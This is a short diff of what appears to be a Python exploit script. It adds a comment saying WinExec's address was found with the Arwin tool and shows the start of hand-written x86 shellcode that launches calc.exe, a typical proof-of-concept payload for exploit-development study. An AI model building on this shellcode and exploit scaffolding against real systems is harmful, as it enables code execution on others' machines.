@@ -15,6 +15,10 @@ import socket
 def p(x):
     return pack('<I',x)
 
+
+# Location of WinExec() found using Arwin
+# https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar
+
 calc = ("\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
 "\x50"                 #=> PUSH EAX             |  Push EAX to have null-byte padding for "calc.exe"
 "\x68\x2E\x65\x78\x65" #=> PUSH ".exe"          \  Push The ASCII string to the stack
